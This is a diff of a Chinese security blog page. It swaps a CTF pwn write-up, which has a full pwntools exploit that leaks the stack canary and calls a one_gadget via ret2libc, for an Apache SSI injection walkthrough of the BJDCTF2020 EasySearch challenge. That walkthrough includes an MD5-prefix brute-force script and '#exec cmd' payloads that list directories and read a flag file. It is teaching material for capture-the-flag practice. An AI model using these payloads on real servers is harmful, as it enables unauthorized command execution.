@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="攻防世界pwn1细节分析, 矢坕个人博客">
+    <meta name="keywords" content="Apache-SSI远程执行漏洞, 矢坕个人博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>攻防世界pwn1细节分析 | 矢坕个人博客</title>
+    <title>Apache-SSI远程执行漏洞 | 矢坕个人博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">攻防世界pwn1细节分析</h1>
+                    <h1 class="description center-align post-title">Apache-SSI远程执行漏洞</h1>
                 </div>
             </div>
         </div>
@@ -431,8 +431,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/pwn-write-up/">
-                                <span class="chip bg-color">pwn-write-up</span>
+                            <a href="/tags/web%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/">
+                                <span class="chip bg-color">web原理讲解</span>
                             </a>
                         
                     </div>
@@ -447,28 +447,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-01-08
+                    2023-08-05
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-01-08
+                    2023-08-05
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    810
+                    444
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    2 分
                 </div>
                 
 
@@ -486,46 +486,79 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="babystack-wp"><a href="#babystack-wp" class="headerlink" title="babystack-wp"></a>babystack-wp</h2><p>对于这题和pwn-100的思路很像，也是一道retlibc3的题目，这题也学到了很多，故写一篇博客记录一下。<br>老样子checksec一下：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/1.png"><br>开了Canary、NX和RELRO无法改写got表<br>拖进IDA查看：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/2.png"><br>有两个函数被调用，一个是列表、一个是给v3赋值<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/3.png"><br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/4.png"><br>函数逻辑很简单，溢出点也很明显，但是没有system函数和&#x2F;bin&#x2F;sh字符串比较麻烦又是retlibc3类型<br>但是这题和pwn-100不一样的是他给了libc-2.23.so文件，意味着我们不用LibcSearcher去寻找靶机的libc版本，比较方便但是他开了canary保护比较难整<br>这里又要讲一个新方法，原理不难可以说很好理解，但要了解pwntools的一些细节。</p>
-<h3 id="利用栈溢出泄露Canary"><a href="#利用栈溢出泄露Canary" class="headerlink" title="利用栈溢出泄露Canary"></a>利用栈溢出泄露Canary</h3><p>前提输入完后，最好有一个puts函数跟在下面把栈中内容输出。<br>这里v6就是Canary离栈底差8h，而s离栈底差90h二者相差88h，我们只要输入0x88个a就可以了，这边是个细节：有人会问为什么0x88就可以，明明没覆盖到canary<br>因为sendline是<strong>发送一行数据</strong>，所以会在<strong>末尾自动补个\n</strong>，而<strong>\n就是\0a正好覆盖到canary的低字节\00</strong>，本来puts碰到\00就会停止读取覆盖为\0a<br>就可以将Canary视为s的一部分一起打印出来，就可以泄露。</p>
-<h3 id="one-garget的使用"><a href="#one-garget的使用" class="headerlink" title="one_garget的使用"></a>one_garget的使用</h3><p>泄露完Canary后面思路都是老套路了，这里给了libc-2.23.so要如何用呢？这里有涉及到一个工具one_gadget<br>安装如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">sudo apt -y install ruby
-sudo gem install one_gadget<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/5.png"><br>one_gadget就是用来去查找动态链接库里execve(“&#x2F;bin&#x2F;sh”, rsp+0x70, environ)函数的<strong>偏移地址</strong>的，还是很好用的。<br><strong>注意是找偏移地址</strong>实际的libc地址还是要自己算。<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/6.png"><br>ropper找到pop rdi;ret;<br>上exp讲解：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
-io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">58094</span><span class="token punctuation">)</span>
-elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./babystack'</span><span class="token punctuation">)</span>
-libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span><span class="token comment">#这就是格式记住</span>
-puts_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-puts_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-main_addr<span class="token operator">=</span><span class="token number">0x0400908</span>
-pop_rdi<span class="token operator">=</span><span class="token number">0x0400a93</span>
-one_gadget<span class="token operator">=</span><span class="token number">0x45216</span>
-payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x88</span>
-io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token comment">#因为sendline自己会补\n，所以要添上“\n”（网上都不讲的，想了半天）</span>
-canary<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#先接收7个字节，如果不够从低字节用\x00补齐到8字节</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#打印看会不会收错</span>
-payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token comment">#泄露puts的真实地址</span>
-io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span> <span class="token comment">#64位传参格式：参数(rdi、rsi、rdx……(6个)可能)+函数地址（plt）+预留返回地址</span>
-io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    <span class="token comment">#32位传参格式：函数地址（plt）+预留返回地址+参数(栈空间)  </span>
-io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token comment">#这里一定要输入3退出才能执行return，才会执行rop链，以前的题目做好rop输入就可以，这题没想到要手动退出卡了好久</span>
-puts_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#接收8个字节，如果不够高字节用\x00补齐</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
-libc_base<span class="token operator">=</span>puts_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
-flag<span class="token operator">=</span>one_gadget<span class="token operator">+</span>libc_base
-payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token comment">#记得退出</span>
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>获取shell：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/7.png"><br>附注覆盖图：<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/8.png"></p>
+                <h1 id="Apache-SSI远程执行漏洞"><a href="#Apache-SSI远程执行漏洞" class="headerlink" title="Apache-SSI远程执行漏洞"></a>Apache-SSI远程执行漏洞</h1><hr>
+<h2 id="SSI简介"><a href="#SSI简介" class="headerlink" title="SSI简介"></a>SSI简介</h2><hr>
+<p> SSI（服务器端包含）是放置在HTML页面中的指令，并在服务页面时在服务器上对其进行评估。它们使您可以将动态生成的内容添加到现有的HTML页面，而不必通过CGI程序或其他动态技术来提供整个页面。</p>
+<p>例如，您可以将指令放置到现有的HTML页面中，例如：</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!--#echo var&#x3D;&quot;DATE_LOCAL&quot; --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>并且，当该页面被投放时，该片段将被评估并替换为其值：</p>
+<pre class="line-numbers language-none"><code class="language-none">Tuesday, 15-Jan-2013 19:28:54 EST<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1540513">参考文章</a></p>
+<hr>
+<h2 id="BJDCTF2020-EasySearch-1"><a href="#BJDCTF2020-EasySearch-1" class="headerlink" title="[BJDCTF2020]EasySearch 1"></a>[BJDCTF2020]EasySearch 1</h2><hr>
+<p>首先开扫，还是字典问题:这里有源码泄露：index.php.swp<br><img src="/images/Apache-SSI%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png"><br>源码：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">function</span> <span class="token function-definition function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span><span class="token punctuation">;</span>
+		<span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//Random 5 times</span>
+		<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$random</span><span class="token punctuation">;</span>
+		<span class="token keyword">return</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+	<span class="token punctuation">&#125;</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token operator">**</span><span class="token operator">*</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'6d0bc1'</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$admin</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('[+] Welcome to manage system')&lt;/script>"</span><span class="token punctuation">;</span>
+            <span class="token variable">$file_shtml</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"public/"</span><span class="token operator">.</span><span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".shtml"</span><span class="token punctuation">;</span>
+            <span class="token variable">$shtml</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_shtml</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'
+            ***
+            ***
+            &lt;h1>Hello,'</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/h1>
+            ***
+			***'</span><span class="token punctuation">;</span>
+            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token operator">**</span><span class="token operator">*</span>
+			<span class="token keyword">echo</span> <span class="token string double-quoted-string">"[!] Header  error ..."</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('[!] Failed')&lt;/script>"</span><span class="token punctuation">;</span>
+            
+    <span class="token punctuation">&#125;</span><span class="token keyword">else</span>
+    <span class="token punctuation">&#123;</span>
+	<span class="token operator">**</span><span class="token operator">*</span>
+    <span class="token punctuation">&#125;</span>
+	<span class="token operator">**</span><span class="token operator">*</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li>代码逻辑：POST传参username不为空,且要绕过md5判断<code>$admin == substr(md5($_POST[&#39;password&#39;]),0,6)</code>,然后会打开一个随机名字的shtml文件将内容写入</li>
+</ul>
+<p>贴上md5绕过脚本：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000000000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    a <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'6d0bc1'</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>得到2020666、2305004、9162671等password</p>
+<hr>
+<p>回显位$_POST[‘username’]为注入点利用SSI漏洞格式注入：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">\\查看当前目录
+<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token comment">#exec cmd="ls"--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>在请求头中发现回显url：<br><img src="/images/Apache-SSI%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.png"><br>访问url：<br><img src="/images/Apache-SSI%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.png"></p>
+<hr>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">\\访问上级目录
+<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token comment">#exec cmd="ls ../"--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/images/Apache-SSI%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.png"></p>
+<hr>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">\\抓取flag
+<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token comment">#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/images/Apache-SSI%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/5.png"></p>
 
                 
             </div>
@@ -552,7 +585,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://airunfive.github.io/2023/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/">http://airunfive.github.io/2023/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/</a>
+                    <a href="http://airunfive.github.io/2023/08/05/Apache-SSI%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">http://airunfive.github.io/2023/08/05/Apache-SSI%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -590,8 +623,8 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/pwn-write-up/">
-                                    <span class="chip bg-color">pwn-write-up</span>
+                                <a href="/tags/web%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/">
+                                    <span class="chip bg-color">web原理讲解</span>
                                 </a>
                             
                         </div>
@@ -761,17 +794,18 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2023/01/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94%E5%AE%9E%E6%97%B6%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B/">
+                <a href="/2023/08/05/Apache-SSI%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="攻防世界——实时数据监测">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="Apache-SSI远程执行漏洞">
                         
-                        <span class="card-title">攻防世界——实时数据监测</span>
+                        <span class="card-title">Apache-SSI远程执行漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -781,9 +815,9 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-01-10
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-05
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -792,11 +826,12 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn-write-up/">
-                        <span class="chip bg-color">pwn-write-up</span>
+                    <a href="/tags/web%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/">
+                        <span class="chip bg-color">web原理讲解</span>
                     </a>
                     
                 </div>
@@ -810,13 +845,13 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E2%80%94monkey/">
+                <a href="/2023/08/04/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="攻防世界——monkey">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="hash长度扩展攻击以及hashpump工具安装">
                         
-                        <span class="card-title">攻防世界——monkey</span>
+                        <span class="card-title">hash长度扩展攻击以及hashpump工具安装</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -827,7 +862,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-08
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-04
                             </span>
                         <span class="publish-author">
                             
@@ -840,8 +875,8 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn-write-up/">
-                        <span class="chip bg-color">pwn-write-up</span>
+                    <a href="/tags/web%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/">
+                        <span class="chip bg-color">web原理讲解</span>
                     </a>
                     
                 </div>
